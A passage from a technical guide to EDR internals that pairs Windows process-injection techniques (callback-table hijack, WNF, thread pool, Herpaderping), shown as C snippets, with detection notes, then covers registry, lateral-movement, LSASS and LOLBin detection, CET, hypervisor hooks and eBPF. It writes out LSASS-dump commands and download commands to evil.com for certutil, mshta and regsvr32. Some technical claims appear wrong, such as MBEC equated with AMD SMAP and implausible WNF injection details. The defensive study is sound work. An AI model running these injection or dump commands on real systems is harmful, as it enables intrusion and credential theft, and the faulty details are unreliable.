    PVOID __fnNCDESTROY;     // [3]  WM_NCDESTROY
    PVOID __fnDWORDOPTINLPMSG;// [4]
    PVOID __fnINOUTDRAG;     // [5]
    PVOID __fnGETTEXTLENGTHS;// [6]
    PVOID __fnINCNTOUTSTRING;// [7]
    PVOID __fnINCNTOUTSTRINGNULL;// [8]
    PVOID __fnINLPCOMPAREITEMSTRUCT; // [9]
    // ... (approximately 100 entries total in user32.dll)
} KERNEL_CALLBACK_TABLE;

// Attack:
// 1. Allocate new table with one entry pointing to shellcode
PVOID newTable = VirtualAlloc(NULL, sizeof(KERNEL_CALLBACK_TABLE),
                               MEM_COMMIT, PAGE_EXECUTE_READWRITE);
memcpy(newTable, PEB->KernelCallbackTable, sizeof(KERNEL_CALLBACK_TABLE));
((PVOID*)newTable)[4] = shellcode_address; // hijack callback 4

// 2. Replace PEB pointer (only needs write to user-mode PEB)
WriteProcessMemory(targetProcess, &targetPeb->KernelCallbackTable, 
                   &newTable, sizeof(PVOID), NULL);

// 3. Trigger the callback (send WM_* message that uses callback slot 4)
SendMessage(targetHwnd, WM_COPYDATA, ...);
// Win32k kernel calls PEB.KernelCallbackTable[4] → shellcode

// EDR detection:
// KCT pointer normally points into user32.dll text section (MEM_IMAGE)
// Modified KCT points to MEM_PRIVATE allocation → anomaly
// ETW-TI: no direct hook point, but ALLOCVM_LOCAL + subsequent behavior
// Hook on NtUserMessageCall / NtCallbackReturn for KCT traversal
// Memory scanner: KCT entries not within user32.dll VA range
```

### 26.5 Windows Notification Facility (WNF) State Injection

WNF was introduced in W8.1 as a publish-subscribe state notification system. Abused as an injection vector since ~2021:

```c
// WNF state data can hold arbitrary binary payloads
// Subscribers are called via kernel APC when state changes

// Attack (PoC by smelly__vx):
// 1. Write shellcode to existing well-known WNF state name
UNICODE_STRING stateName = L"WNF_SHEL_DESKTOP_APPLICATION_STARTED";
// Resolve NtUpdateWnfStateData dynamically
NtUpdateWnfStateData(&stateName, shellcode, shellcode_size, 
                     NULL, NULL, 0, 0);

// 2. The WNF runtime delivers a callback APC to all subscribers
// Subscribers include: Windows Shell, Explorer, other system processes
// Their APC fires in context of those processes → code execution

// Why this matters for EDR:
// → No cross-process handle needed (WNF is global state)
// → No CreateRemoteThread (no thread creation callback)
// → No VirtualAllocEx (kernel manages WNF memory internally)

// Detection:
// → NtUpdateWnfStateData called with large payload
// → WNF state size anomaly (system states typically << 1KB)
// → APC callback address points to memory in subscriber process
//   that was just filled with the WNF payload content
// → ETW kernel events for WNF update operations
```

### 26.6 Thread Pool Injection (TpRtl)

```c
// Windows thread pool managed by ntdll!TppWorkerThread
// Callback work items executed in pool threads
// Injection: hijack a thread pool work item in target process

// Attack chain:
// 1. Find thread pool in target (walk ntdll!TpRtlpWorkerFactory)
//    Factory = NtQuerySystemInformation → find worker factory handles
HANDLE hWorkerFactory;
// Query OBJECT_TYPE_INFORMATION to find worker factories in target

// 2. Queue work item pointing to shellcode
TP_CALLBACK_ENVIRON tce = {0};
InitializeThreadpoolEnvironment(&tce);
PTP_WORK work = CreateThreadpoolWork((PTP_WORK_CALLBACK)shellcode, NULL, &tce);
SubmitThreadpoolWork(work);

// Cross-process variant:
// NtSetInformationWorkerFactory with WorkerFactoryThreadMinimum
// Forces thread pool to dispatch in remote process

// Stealth:
// → Thread creation from legitimate thread pool thread (ntdll worker)
// → Callstack looks like: ntdll!TppWorkerThread → shellcode
// → PsSetCreateThreadNotifyRoutine does NOT fire (using existing thread)

// EDR Detection:
// → Thread pool work items normally point to MEM_IMAGE code
// → Hijacked item points to MEM_PRIVATE → flagged
// → NtSetInformationWorkerFactory with unusual params: suspicious
// → ETW-TI: if shellcode calls protected APIs → detected
```

### 26.7 Transacted Hollowing / Herpaderping (2021)

Process Herpaderping creates a process whose on-disk image is modified *after* the section is created but *before* the process is created:

```c
// Step 1: Write payload to temp file
HANDLE hFile = CreateFile("C:\\Windows\\Temp\\legit.exe", ...);
WriteFile(hFile, malware_bytes, malware_size, ...);

// Step 2: Create section from file (section references file OBJECT, not content)
HANDLE hSection;
NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, NULL,
                PAGE_READONLY, SEC_IMAGE, hFile);
// Section now references file OBJECT (not the bytes)

// Step 3: OVERWRITE the file with benign content
// The section still refers to the ORIGINAL malware bytes in page file
SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
WriteFile(hFile, benign_bytes, benign_size, ...); // overwrite with calc.exe

// Step 4: Create process from section
HANDLE hProcess, hThread;
NtCreateProcessEx(&hProcess, PROCESS_ALL_ACCESS, NULL, 
                  NtCurrentProcess(), PS_REQUEST_BREAKAWAY, 
                  hSection, NULL, NULL, FALSE);
// Process runs MALWARE but on-disk file shows BENIGN content!

// Step 5: Create thread in process
NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, 
                 entry_point, NULL, 0, 0, 0, 0, NULL);

// EDR Detection:
// Defender: GetMappedFileName returns path to temp file → hash mismatch
// NtQueryVirtualMemory(MemoryMappedFilenameInformation) → path discovery
// NtQueryObject(ObjectNameInformation) on section → reveals backing file
// Integrity check: section content ≠ current file content → alert
// Hollowing detection: EPROCESS.SectionBaseAddress vs file hash
// W10 19H1+: NtCreateProcessEx blocked for non-IMAGE sections in some configs
```

---

## SECTION 27: ALPC — The EDR's Internal Communication Layer

### 27.1 ALPC vs Named Pipes vs IOCTLs

EDR components use multiple IPC mechanisms with different security properties:

| Mechanism | Security | Async? | Used By |
|-----------|---------|--------|---------|
| IOCTLs (DeviceIoControl) | DACL on device | Synchronous/Async | CSAgent, WdFilter comms |
| FltCreateCommunicationPort | FltMgr security | Sync | Minifilter ↔ user service |
| ALPC | Port security descriptor | Async | WdFilter internal, some EDRs |
| Named Pipe | DACL on pipe | Both | WdFilter ports, CrowdStrike |
| Shared Memory + Event | Object ACL | Event-driven | High-throughput telemetry |

### 27.2 ALPC Port Object Model

```c
// Creating an ALPC server port in kernel driver
OBJECT_ATTRIBUTES portAttr;
UNICODE_STRING portName = RTL_CONSTANT_STRING(L"\\EDRPort");
InitializeObjectAttributes(&portAttr, &portName, OBJ_KERNEL_HANDLE, NULL, NULL);

// Set security descriptor (restrict to specific service account)
SECURITY_DESCRIPTOR sd;
RtlCreateSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION);
// ... set DACL to allow only EDR service SID

ALPC_PORT_ATTRIBUTES portInfo = {
    .Flags = ALPC_PORFLG_ALLOW_LPC_REQUESTS,
    .SecurityQos = { SecurityImpersonation, SECURITY_DYNAMIC_TRACKING, FALSE },
    .MaxMessageLength = 0x1000,
    .MemoryBandwidth = 0,
    .MaxPoolUsage = SIZE_MAX,
    .MaxSectionSize = SIZE_MAX,
    .MaxViewSize = SIZE_MAX,
    .MaxTotalSectionSize = SIZE_MAX,
    .DupObjectTypes = 0
};

NtAlpcCreatePort(&hPort, &portAttr, &portInfo);

// ALPC message format
typedef struct _ALPC_MESSAGE {
    PORT_MESSAGE Header;  // fixed header
    UCHAR        Data[MAX_PAYLOAD_SIZE];
} ALPC_MESSAGE;

typedef struct _PORT_MESSAGE {
    union {
        struct {
            CSHORT DataLength;
            CSHORT TotalLength;
        } s1;
        ULONG Length;
    } u1;
    union {
        struct {
            CSHORT Type;          // LPC_REQUEST, LPC_REPLY, LPC_DATAGRAM, etc.
            CSHORT DataInfoOffset;
        } s2;
        ULONG ZeroInit;
    } u2;
    union {
        CLIENT_ID ClientId;   // PID + TID of sender
        double DoNotUseThisField;
    };
    ULONG MessageId;
    union {
        SIZE_T ClientViewSize;  // on requests
        ULONG  CallbackId;      // on replies
    };
} PORT_MESSAGE;
```

### 27.3 ALPC Security Attributes for EDR Hardening

```c
// EDR restricts ALPC port access using security descriptor
// Only the EDR's service SID can connect
// Non-PPL processes cannot impersonate past the port's SQ
// Prevents:
//   → Malware connecting to EDR's ALPC port to send forged events
//   → Malware impersonating EDR service via ALPC
//   → Denial of service by flooding ALPC message queue

// CSAgent.sys (CrowdStrike) uses ALPC with:
// MaxMessageLength = 0x1000 (4KB max message)
// Security impersonation level = SecurityIdentification (cannot impersonate)
// DACL: allow only CrowdStrike service account SID
```

---

## SECTION 28: Registry Monitoring Deep Dive

### 28.1 Configuration Manager Internals

The Windows registry is managed by the Configuration Manager (CM), accessed via `ntoskrnl.exe`'s `Cm*` functions. EDRs use `CmRegisterCallbackEx` to hook into the CM's operation dispatch.

```
Registry Operation Flow:
  User calls RegSetValueEx()
         │
         ▼ (ntdll stub → syscall)
  NtSetValueKey (kernel)
         │
         ▼
  CmpSetValueKeyNew / CmpSetValueNew
         │
         ▼
  CmpCallCallBacks(RegNtPreSetValueKey, ...)   ← PRE-CALLBACK fires here
         │
         ▼
  HvSetCell / CmpAddValueToList (actual write)
         │
         ▼
  CmpCallCallBacks(RegNtPostSetValueKey, ...)  ← POST-CALLBACK fires here
```

### 28.2 CM Callback Operation Types

```c
// Full list of REG_NOTIFY_CLASS values for CmRegisterCallbackEx:
typedef enum _REG_NOTIFY_CLASS {
    RegNtDeleteKey,              // pre-delete key
    RegNtPreDeleteKey            = RegNtDeleteKey,
    RegNtSetValueKey,            // pre-set value
    RegNtPreSetValueKey          = RegNtSetValueKey,
    RegNtDeleteValueKey,         // pre-delete value
    RegNtPreDeleteValueKey       = RegNtDeleteValueKey,
    RegNtSetInformationKey,      // pre-set key info
    RegNtPreSetInformationKey    = RegNtSetInformationKey,
    RegNtRenameKey,              // pre-rename key
    RegNtPreRenameKey            = RegNtRenameKey,
    RegNtEnumerateKey,           // pre-enumerate subkeys
    RegNtPreEnumerateKey         = RegNtEnumerateKey,
    RegNtEnumerateValueKey,      // pre-enumerate values
    RegNtPreEnumerateValueKey    = RegNtEnumerateValueKey,
    RegNtQueryKey,               // pre-query key info
    RegNtPreQueryKey             = RegNtQueryKey,
    RegNtQueryValueKey,          // pre-query value
    RegNtPreQueryValueKey        = RegNtQueryValueKey,
    RegNtQueryMultipleValueKey,
    RegNtPreQueryMultipleValueKey = RegNtQueryMultipleValueKey,
    RegNtPreCreateKey,           // pre-create key
    RegNtPostCreateKey,          // post-create key
    RegNtPreOpenKey,             // pre-open key
    RegNtPostOpenKey,            // post-open key
    RegNtKeyHandleClose,
    RegNtPreKeyHandleClose       = RegNtKeyHandleClose,
    RegNtPostDeleteKey,          // post versions of all above
    RegNtPostSetValueKey,
    RegNtPostDeleteValueKey,
    RegNtPostSetInformationKey,
    RegNtPostRenameKey,
    RegNtPostEnumerateKey,
    RegNtPostEnumerateValueKey,
    RegNtPostQueryKey,
    RegNtPostQueryValueKey,
    RegNtPostQueryMultipleValueKey,
    RegNtPostKeyHandleClose,
    RegNtPreCreateKeyEx,         // extended versions with additional info
    RegNtPostCreateKeyEx,
    RegNtPreOpenKeyEx,
    RegNtPostOpenKeyEx,
    RegNtPreFlushKey,
    RegNtPostFlushKey,
    RegNtPreLoadKey,
    RegNtPostLoadKey,
    RegNtPreUnLoadKey,
    RegNtPostUnLoadKey,
    RegNtPreQueryKeySecurity,
    RegNtPostQueryKeySecurity,
    RegNtPreSetKeySecurity,
    RegNtPostSetKeySecurity,
    RegNtCallbackObjectContextCleanup,
    RegNtPreRestoreKey,
    RegNtPostRestoreKey,
    RegNtPreSaveKey,
    RegNtPostSaveKey,
    RegNtPreReplaceKey,
    RegNtPostReplaceKey,
    RegNtPreQueryKeyName,
    RegNtPostQueryKeyName,
    MaxRegNtNotifyClass
} REG_NOTIFY_CLASS;
```

### 28.3 High-Value Registry Keys for EDR Monitoring

```c
// Persistence and privilege escalation hotspots:
// (EDR monitors writes to ALL of these)

// Auto-run persistence:
L"\\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
L"\\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"
L"\\REGISTRY\\MACHINE\\SYSTEM\\CurrentControlSet\\Services"  // service install

// DLL hijacking / side-loading:
L"\\REGISTRY\\MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\AppCertDlls"
L"\\REGISTRY\\MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\AppInit_DLLs"

// COM/CLSID hijacking:
L"\\REGISTRY\\USER\\*\\SOFTWARE\\Classes\\CLSID"
L"\\REGISTRY\\MACHINE\\SOFTWARE\\Classes\\CLSID"

// ETW/audit disabling:
L"\\REGISTRY\\MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger"

// AV/EDR disabling:
L"\\REGISTRY\\MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender"

// Credential storage:
L"\\REGISTRY\\MACHINE\\SAM\\SAM\\Domains\\Account\\Users"  // SAM database

// Boot persistence:
L"\\REGISTRY\\MACHINE\\SYSTEM\\CurrentControlSet\\Control\\BootVerificationProgram"
```

**Pre-callback optimization**: EDR's CM callback can inspect the key path immediately (from `REG_SET_VALUE_KEY_INFORMATION.CompleteName`) and short-circuit by returning `STATUS_CALLBACK_BYPASS` for non-interesting keys — avoiding the overhead of processing every registry operation.

---

## SECTION 29: Lateral Movement Detection

### 29.1 WMI Lateral Movement

```
WMI Remote Execution Attack:
  
  Attacker Machine                    Target Machine
  ──────────────                      ──────────────
  WMIC /node:target                   
    process call create "cmd.exe"
         │
         │ (DCOM, TCP 135/dynamic)
         ▼
                                 WinMgmt service (svchost.exe)
                                   │
                                 WmiPrvSE.exe spawns
                                   │
                                 cmd.exe (child of WmiPrvSE)

EDR Detection:
  Target-side EDR sees:
  1. DCOM incoming connection (WFP ALE_AUTH_RECV_ACCEPT from remote IP)
  2. Process creation: parent=WmiPrvSE.exe, image=cmd.exe
  3. No user logon session (Session 0, no interactive)
  4. WmiPrvSE as parent is HIGHLY suspicious for cmd/powershell/wscript
  5. Alert: "WMI Remote Process Execution from [attacker IP]"
  
  Source-side EDR sees:
  1. WMIC.exe or WbemExec DCOM calls
  2. Network connection to target:135
  3. Process tree: attacker.exe → wmic.exe → (remote execution)
```

### 29.2 PsExec / SMB Lateral Movement

```
PsExec Attack Detection:

  1. SMB connection to ADMIN$ or C$ (WFP alert: unexpected admin share access)
  2. File copy of service binary to \\target\ADMIN$\PSEXESVC.exe
     (Minifilter: file write to system32 equivalent path)
  3. Service control: create PSEXESVC service via SCM
     (Registry: HKLM\SYSTEM\CurrentControlSet\Services\PSEXESVC creation)
     (ETW: Service installation event)
  4. Service start → process creation (svchost context, no TTY)
  5. Named pipe: \\target\pipe\PSEXESVC (pipe creation event)

EDR Behavioral Chain:
  SMB_WRITE(PSEXESVC.exe) 
    → SCM_SERVICE_CREATE(PSEXESVC) 
    → PROCESS_CREATE(PSEXESVC.exe, parent=services.exe)
    → PIPE_CREATE(\pipe\PSEXESVC)
  → ALERT: PsExec-like lateral movement pattern
```

### 29.3 DCOM Lateral Movement

```c
// Attack: Use DCOM to create process on remote machine
// Common abused CLSIDs:
// {9BA05972-F6A8-11CF-A442-00A0C90A8F39} - ShellWindows
// {C08AFD90-F2A1-11D1-8455-00A0C91F3880} - ShellBrowserWindow  
// {49B2791A-B1AE-4C90-9B8E-E860BA07F889} - MMC20.Application

// Defender detection: DCOM activations that cross process trust boundaries
// 1. DCOM activation from non-system process to SYSTEM service
// 2. Resulting process (dllhost.exe surrogate) spawning shells
// 3. CLSID not in whitelist of legitimate business CLSIDs
// 4. Remote DCOM (cross-machine) from non-admin user context
```

### 29.4 Pass-the-Hash / Kerberoasting Detection

```
Pass-the-Hash (NTLM-based):
  → Network logon (Type 3) without preceding interactive logon (Type 2)
  → Source: non-domain-joined workstation
  → NTLM auth (not Kerberos) to sensitive resource
  → ETW Security events: 4624 (Logon) + 4648 (explicit credentials)
  → Unusual NTHash used without cleartext password
  → EDR: Security audit events 4768, 4769 (TGT/TGS request anomalies)

Kerberoasting:
  → TGS (Ticket-Granting Service) requests for service accounts
  → Multiple SPN requests in short timeframe from non-admin user
  → ETW: Security Event 4769 (Kerberos Service Ticket)
  → Unusual requesting account: user requests MANY service tickets
  → MDE: "Anomalous Kerberos service ticket requests" rule
  
DCSync:
  → MS-DRSR protocol traffic (Directory Replication Service Remote Protocol)
  → Source: non-DC machine sending GetNCChanges() requests
  → Network: unusual LDAP/SMB traffic on port 49152+ to DC
  → ETW: Security Event 4662 (Object operation: replication extended right)
  → MDE: "Suspected DCSync attack" behavioral rule
```

---

## SECTION 30: Credential Access and LSASS Defense

### 30.1 LSASS as the Crown Jewel

LSASS (Local Security Authority Subsystem Service) stores:
- NTLM password hashes
- Kerberos tickets (TGT, TGS)
- Cleartext credentials (wdigest, when enabled)
- LSA secrets
- DPAPIblob master keys

### 30.2 LSASS Protection Layers

```
LSASS Defense Stack (bottom to top):
  ┌────────────────────────────────────────────────────────────┐
  │ PPL AM-PPL (PsProtectedSignerLsa-Light or Full)           │
  │   → Non-PPL processes cannot get vm_read handle to LSASS  │
  │   → Enforced in ObpGrantAccess() by kernel                │
  ├────────────────────────────────────────────────────────────┤
  │ Windows Defender Credential Guard (VBS/VTL1)              │
  │   → LSA isolated process in Secure Kernel (VTL1)          │
  │   → Credentials stored in isolated trustlet               │
  │   → Even with LSASS kernel access: credentials unavailable│
  ├────────────────────────────────────────────────────────────┤
  │ ObRegisterCallbacks                                        │
  │   → Pre-callback strips PROCESS_VM_READ from handle to lsass│
  │   → Effective against non-BYOVD attackers                 │
  ├────────────────────────────────────────────────────────────┤
  │ EDR Behavioral Detection                                   │
  │   → OpenProcess(lsass) from unusual process → alert        │
  │   → MiniDumpWriteDump on LSASS → alert                    │
  │   → ReadProcessMemory to LSASS address space → alert      │
  │   → SecLogon / procdump -ma lsass patterns → alert        │
  ├────────────────────────────────────────────────────────────┤
  │ Audit Logging                                             │
  │   → Security Event 4656 (object handle requested for lsass)│
  │   → Security Event 10 (Process access — Sysmon equivalent) │
  └────────────────────────────────────────────────────────────┘
```

### 30.3 LSASS Dump Techniques and Detection

| Technique | Method | Detection |
|-----------|--------|-----------|
| Task Manager | MiniDumpWriteDump from taskmgr.exe | MiniDumpWriteDump hook, file write to .dmp |
| ProcDump | `procdump -ma lsass.exe` | Process creation (procdump.exe), VM_READ access |
| Comsvcs.dll | `rundll32 comsvcs.dll,MiniDump lsass.exe full` | DLL load + MiniDump export call |
| PPLdump | BYOVD to elevate own PPL → read LSASS | BYOVD detection, PPL modification |
| Nanodump | Partial dump via handle table walk | Anomalous read pattern, no MiniDump API |
| SilentProcessExit | WER-based dump via registry trick | Registry modification (WER settings) |
| Shadow Copy | Copy NTDS.dit from shadow volume | VSS snapshot access, NTDS path access |
| DCSync | Replication protocol dump | DC replication request from non-DC |

---

## SECTION 31: Living off the Land (LOLBins/LOLDrivers) Detection

### 31.1 LOLBin Detection Philosophy

"Living off the Land" attacks abuse **legitimate Windows binaries** (LOLBins) to evade hash-based detection. The EDR must detect **behavior**, not **signature**.

Key LOLBins and their detection:

```
certutil.exe:
  Legitimate: Certificate management
  Abuse: Download files (certutil -urlcache -f http://evil.com/payload.exe C:\tmp\x.exe)
  Detection: certutil.exe + network connection + file write to suspicious path
  Behavioral rule: certutil + download + file in temp/public/appdata

mshta.exe:
  Legitimate: Execute HTA (HTML Application) files
  Abuse: Execute VBScript/JScript remotely (mshta.exe http://evil.com/payload.hta)
  Detection: mshta.exe + network connection to non-corporate URL
  Behavioral rule: mshta spawned by email client / document app

wscript.exe / cscript.exe:
  Legitimate: Windows Script Host
  Abuse: Execute arbitrary VBScript/JScript
  Detection: Spawned by Office app, email client, or from temp paths
  AMSI: Script content scanned regardless of obfuscation

regsvr32.exe:
  Legitimate: Register COM objects
  Abuse: Execute DLL/scrobj via /s /n /u /i:http://evil.com/payload.sct
  Detection: regsvr32 + network connection (scrobj.dll remote script)
  Behavioral rule: regsvr32 + outbound HTTP = Squiblydoo attack

msiexec.exe:
  Legitimate: Install MSI packages
  Abuse: Execute DLL (msiexec /y malicious.dll), remote MSI (msiexec /q /i http://)
  Detection: msiexec + network + DLL load from temp path

wmic.exe:
  Legitimate: WMI command line
  Abuse: Process creation, persistence, code execution
  Detection: wmic process call create "...", wmic /format:xsl (XSL injection)
  Behavioral rule: wmic spawning cmd/powershell

bitsadmin.exe:
  Legitimate: Background Intelligent Transfer Service jobs
  Abuse: Download arbitrary files (persistence via BITS jobs)
  Detection: bitsadmin + network + file write + task persistence in BITS
  ETW: BITS job creation events

PowerShell (special case):
  AMSI: Script content scanned (obfuscation partially covered)
  Constrained Language Mode: blocks most PowerShell abuses
  ScriptBlock logging: ETW Microsoft-Windows-PowerShell/Operational
  Transcript logging: records all I/O
  Detection: -EncodedCommand, Invoke-Expression, IEX, bypass flags
```

### 31.2 LOLDriver Detection

LOLDrivers are **legitimate signed kernel drivers** with exploitable vulnerabilities. Detection approaches:

```
Prevention (WDAC + Vulnerable Driver Blocklist):
  → Microsoft-maintained blocklist (updated via Windows Update)
  → ~200+ known vulnerable drivers as of 2026
  → WDAC policy can enforce custom allowlist

Detection (when running):
  → Monitor PnP driver load events (EventID 6, System log)
  → Check loaded driver hash against VulnerableDriverBlocklist.xml
  → Monitor for IOCTL codes known to be exploitable
  → Memory scan for vulnerable driver signatures in kernel pool
  → ETW: Microsoft-Windows-Kernel-PnP events for driver loads

Behavioral detection (post-exploitation):
  → Rapid callback array modification after suspicious driver load
  → ETW-TI provider disabling after driver load
  → LSASS access from process that just loaded a new driver
  → EDRSandblast behavioral pattern: PDB download + ntoskrnl scan
```

---

## SECTION 32: CET and Shadow Stack — Hardware-Level CFI

### 32.1 CET Architecture

Intel CET (Control-flow Enforcement Technology) provides **hardware-enforced** protection against ROP and JOP:

```
CET Components:
  1. Shadow Stack (SHSTK):
     Separate, read-only stack maintained by CPU hardware
     CALL instruction → pushes return address to BOTH main stack AND shadow stack
     RET instruction → pops both, COMPARES them, faults if different
     
  2. Indirect Branch Tracking (IBT):
     All valid indirect call/jump targets must be preceded by ENDBR64 instruction
     JMP/CALL to non-ENDBR64 target → #CP (Control Protection) fault → BSOD/crash
```

### 32.2 Shadow Stack Operation

```
Normal execution (no ROP):
  CALL foo:                          RET in foo:
    Main stack: [push RIP]             Main stack: [pop RIP] → jump to RIP
    Shadow stack: [push RIP] (CPU)     Shadow stack: [pop expected]
                                       COMPARE: expected == actual → OK

ROP attack (attempting to return to shellcode):
  Attacker overwrites [RSP] with shellcode_addr
  Main stack: [shellcode_addr]
  Shadow stack: [original RIP]        ← CPU recorded original, NOT attacker's
  RET: compare shellcode_addr vs original → MISMATCH → #CP fault
  → Process terminated / BSOD
```

### 32.3 Windows CET Implementation

CET is enabled per-process via `EPROCESS.MitigationFlags2.CetUserShadowStacksEnabled` (bit 16):

```c
// Checking CET status from kernel:
BOOLEAN IsCETEnabled(PEPROCESS Process) {
    ULONG flags2 = *(ULONG*)((PUCHAR)Process + MITIGATION_FLAGS2_OFFSET);
    return (flags2 & 0x00010000) != 0; // bit 16
}

// CET interaction with NtContinue:
// NtContinue is used for exception resumption and is critical for:
// → Stack unwind during SEH/VEH
// → Legitimate APC delivery
// → User-mode coroutines

// With CET enabled:
// NtContinue validates that the Rip in CONTEXT record
// matches a CFG-registered address OR has CET shadow stack backing
// If attacker uses NtContinue to jump to arbitrary code:
//   → Shadow stack: expected return addr ≠ Rip in CONTEXT
//   → CET check fails → NtContinue rejected
```

### 32.4 EDR Interaction with CET

CET is both an EDR ally and a challenge:

**CET as EDR ally:**
- Prevents classic ROP-based call stack spoofing (synthetic frames fail shadow stack comparison)
- SilentMoonwalk and similar techniques become non-functional on CET-enabled processes
- Hardens the EDR's own service process against ROP exploitation

**CET challenges for EDR:**
- EDR trampoline hooks use `JMP` not `CALL/RET` → need ENDBR64-compatible implementation
- Hardware breakpoint-based AMSI bypass: `NtContinue` in CET-enabled process requires shadow stack alignment
- EDR must handle `#CP` faults (Control Protection exceptions) — may look like false positives

**Detection opportunity:**
- `SetProcessMitigationPolicy(ProcessUserShadowStackPolicy)` call on self → process disabling CET on itself → suspicious
- `NtSetInformationProcess(handle, ProcessShadowStackPolicy, ...)` on another process → injection prep
- CET violation faults (`#CP`) in unexpected processes → attempted ROP in legitimate process

---

## SECTION 33: Hypervisor-Level EDR — EPT Hook Architecture

### 33.1 Why Hypervisor-Level?

Kernel-level EDR runs at ring 0. A hypervisor runs at ring -1 (VMX root mode). From ring -1, the hypervisor can observe *everything* the guest kernel does, including:
- Every memory access (via EPT violations)
- Every VMCALL from guest
- Every MSR read/write
- Every CPUID instruction
- All I/O port operations

This makes hypervisor-based EDR **completely invisible to the guest OS** and immune to any kernel-level bypass.

### 33.2 EPT (Extended Page Tables) Hook Mechanism

```
Without hypervisor:
  Virtual Address (guest) → Guest Physical Address → Host Physical Address
  
With hypervisor + EPT:
  Virtual Address (guest) → Guest Physical Address → EPT Table → Host Physical Address
  
  EPT Table Entry bits:
  [0]: Read permission
  [1]: Write permission
  [2]: Execute permission  ← crucial for code hooks
  [3-5]: Reserved
  [6]: User-mode execute (UXE, MBEC)
  ...
  [12+]: Physical page address

EPT Hook Mechanism:
  1. Identify target function in guest kernel (e.g., NtAllocateVirtualMemory)
  2. Create TWO physical pages:
     Page A: Original code (for reading/integrity checks)
     Page B: Hooked code (for execution)
  3. Set EPT entry for target VA:
     Read → points to Page A (reads see original bytes)
     Execute → points to Page B (execution goes to hook)
  
  Effect:
  - Guest reads NtAllocateVirtualMemory → sees original unmodified bytes
  - Guest executes NtAllocateVirtualMemory → runs hooked version
  - Memory integrity scanners: CLEAN (reading original page)
  - BYOVD: cannot remove hook (it's in hypervisor, not guest kernel)
```

### 33.3 MBEC (Mode-Based Execute Control)

MBEC (Intel MBEC / AMD SMAP) allows the hypervisor to set different execute permissions for user-mode vs kernel-mode code on the same physical page:

```
EPT Entry with MBEC:
  [2]: Supervisor-mode execute permission  (kernel code)
  [6]: User-mode execute permission        (user-mode code)

Use case: Hook only kernel-mode execution, allow user-mode reads
  → Hook NtAllocateVirtualMemory for supervisor access
  → Allow user-mode read of ntdll.dll stubs (unmodified)
  → User-mode memory scanners: see clean ntdll
  → Kernel execution: goes through hook
```

### 33.4 Products Using Hypervisor-Level Detection

| Product | Hypervisor Approach |
|---------|--------------------| 
| BitDefender Hypervisor Memory Introspection | VMI API, EPT hooks |
| VMware Carbon Black | VMware vShield endpoint API |
| Bromium (now HP Sure Click) | Micro-VM per browser tab |
| Quarkslab Hyperbone | Research EPT hook framework |
| Microsoft VBS/HVCI | Not EDR per se, but enforces security invariants |

### 33.5 Defeating Hypervisor EDR

The attacker must operate at ring -1 or below:
- **Boot-level attack**: Replace hypervisor before EDR hypervisor loads
- **Signed hypervisor bug**: Find and exploit a bug in the hypervisor itself
- **Hardware vulnerability**: Spectre/Meltdown class bugs that cross VMX root/non-root boundary
- **Practical reality**: Hypervisor-level EDR is effectively undefeatable by software-only attacks

---

## SECTION 34: Linux EDR — eBPF, LSM, and Beyond

### 34.1 eBPF for Security Monitoring

eBPF (extended Berkeley Packet Filter) is the dominant technology for Linux EDR in 2025-2026. Unlike kernel modules, eBPF programs are:
- Verified by an in-kernel verifier (safety guaranteed)
- JIT-compiled for performance
- Cannot crash the kernel (bounded loops, safe memory access)
- Updatable without kernel reboot

```c
// Example: eBPF program monitoring execve syscall
#include <linux/bpf.h>
#include <bpf/bpf_helpers.h>

// BPF map for event communication (ring buffer)
struct {
    __uint(type, BPF_MAP_TYPE_RINGBUF);
    __uint(max_entries, 1 << 24); // 16MB ring buffer
} events SEC(".maps");

// Attach to sys_enter_execve tracepoint
SEC("tracepoint/syscalls/sys_enter_execve")
int trace_execve(struct trace_event_raw_sys_enter *ctx) {
    // Capture: filename, argv, envp, calling PID/TID
    struct exec_event *e = bpf_ringbuf_reserve(&events, sizeof(*e), 0);
    if (!e) return 0;
    
    e->pid = bpf_get_current_pid_tgid() >> 32;
    e->ppid = /* walk task_struct chain */;
    bpf_get_current_comm(e->comm, sizeof(e->comm));
    
    // Read filename argument
    const char *filename = (const char *)ctx->args[0];
    bpf_probe_read_user_str(e->filename, sizeof(e->filename), filename);
    
    bpf_ringbuf_submit(e, 0);
    return 0;
}
```

### 34.2 Linux Security Module (LSM) Hooks

LSM provides **mandatory access control** hooks at security-sensitive kernel operations:

```c
// LSM hooks relevant to EDR:
// (implemented as eBPF programs via KRSI - Kernel Runtime Security Instrumentation)

// Process execution:
int security_bprm_check(struct linux_binprm *bprm)  // before exec
int security_bprm_creds_for_exec(struct linux_binprm *bprm) // credential check

// File operations:
int security_file_open(struct file *file)  // file open
int security_file_permission(struct file *file, int mask) // read/write/exec check
int security_inode_create(struct inode *dir, struct dentry *dentry, umode_t mode)
int security_inode_unlink(struct inode *dir, struct dentry *dentry)

// Network:
int security_socket_connect(struct socket *sock, struct sockaddr *address, int addrlen)
int security_socket_sendmsg(struct socket *sock, struct msghdr *msg, int size)

// Process:
int security_task_kill(struct task_struct *p, struct kernel_siginfo *info, int sig, ...)
int security_ptrace_access_check(struct task_struct *child, unsigned int mode)

// Memory:
int security_mmap_file(struct file *file, unsigned long prot, unsigned long flags)
int security_mprotect(struct vm_area_struct *vma, unsigned long reqprot, ...)
```

### 34.3 eBPF CO-RE (Compile Once, Run Everywhere)

Modern Linux EDRs use CO-RE to avoid kernel version fragmentation:

```c
// CO-RE uses BTF (BPF Type Format) embedded in kernel
// Allows field access with automatic offset calculation

// Without CO-RE (fragile):
pid_t pid = *(pid_t*)((char*)task + 0x4B4); // hardcoded offset, breaks on version change

// With CO-RE (robust):
#include "vmlinux.h"  // BTF-generated types for current kernel
pid_t pid = BPF_CORE_READ(task, pid);  // verifier inserts correct offset at load time
```

**CrowdStrike Falcon on Linux** (eBPF-based):
